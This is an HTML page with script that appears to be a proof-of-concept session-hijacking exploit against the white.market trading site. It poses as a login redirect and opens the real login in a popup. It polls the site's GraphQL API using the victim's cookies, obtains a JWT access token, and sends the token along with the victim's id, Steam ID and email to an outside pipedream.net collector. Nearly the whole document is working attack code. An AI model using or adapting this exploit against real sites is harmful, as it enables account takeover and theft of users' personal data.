<!DOCTYPE html>
<html>
<head><title>White Market - Login</title></head>
<body>
<h1>Redirecting to Steam Login...</h1>
<div id="status"></div>
<script>
const status = document.getElementById('status');
const REQUESTBIN = 'https://eo5dlnbgif530n8.m.pipedream.net';

// Redirect victim to real Steam login
status.innerHTML = 'Opening Steam login in popup...<br>';

// Open Steam login in popup
const loginWindow = window.open(
    'https://white.market/login',
    'steam_login',
    'width=600,height=700'
);

status.innerHTML += 'Login window opened<br>';
status.innerHTML += 'Monitoring for successful login...<br><br>';

let pollCount = 0;
const maxPolls = 60; // Poll for up to 60 seconds

// Poll the API to detect when user logs in
const pollInterval = setInterval(async () => {
    pollCount++;
    status.innerHTML += `Poll ${pollCount}/${maxPolls}<br>`;
    
    try {
        // Try to fetch user profile (requires authentication)
        const response = await fetch('https://api.white.market/graphql/api', {
            method: 'POST',
            credentials: 'include',
            headers: {
                'Content-Type': 'application/json',
                'x-accept-language': 'en_US'
            },
            body: JSON.stringify({
                query: 'query { person: person_profile { id steamId email } }',
                operationName: 'PersonProfile'
            })
        });
        
        const data = await response.json();
        
        if (data.data && data.data.person) {
            // SUCCESS - User is logged in!
            clearInterval(pollInterval);
            
            status.innerHTML += '<br><strong>LOGIN DETECTED!</strong><br>';
            status.innerHTML += 'User data: ' + JSON.stringify(data.data.person).substring(0, 200) + '<br><br>';
            
            // Now steal their session by generating a JWT
            const jwtResponse = await fetch('https://api.white.market/graphql/api', {
                method: 'POST',
                credentials: 'include',
                headers: {
                    'Content-Type': 'application/json',
                    'x-accept-language': 'en_US'
                },
                body: JSON.stringify({
                    query: 'mutation AuthToken { auth_token { accessToken } }',
                    operationName: 'AuthToken'
                })
            });
            
            const jwtData = await jwtResponse.json();
            
            if (jwtData.data && jwtData.data.auth_token) {
                status.innerHTML += '<strong>JWT STOLEN!</strong><br>';
                status.innerHTML += 'JWT: ' + jwtData.data.auth_token.accessToken.substring(0, 100) + '...<br>';
                
                // Exfiltrate
                fetch(REQUESTBIN, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        attack: 'SESSION_HIJACK_SUCCESS',
                        jwt: jwtData.data.auth_token.accessToken,
                        victim_data: data.data.person,
                        timestamp: new Date().toISOString()
                    })
                });
            } else {
                status.innerHTML += 'JWT generation failed (user might not have refresh token)<br>';
                status.innerHTML += 'But we can still make authenticated requests!<br>';
                
                // Even without JWT, we can still exfiltrate data via CORS
                fetch(REQUESTBIN, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        attack: 'SESSION_HIJACK_PARTIAL',
                        victim_data: data.data.person,
                        note: 'Can make authenticated requests while user is logged in',
                        timestamp: new Date().toISOString()
                    })
                });
            }
            
            // Close popup and redirect
            if (loginWindow) loginWindow.close();
            setTimeout(() => {
                window.location.href = 'https://white.market';
            }, 3000);
        }
        
    } catch (e) {
        // User not logged in yet, keep polling
    }
    
    if (pollCount >= maxPolls) {
        clearInterval(pollInterval);
        status.innerHTML += '<br>Timeout - user did not complete login<br>';
        if (loginWindow) loginWindow.close();
    }
    
}, 1000); // Poll every second

</script>
</body>
</html>
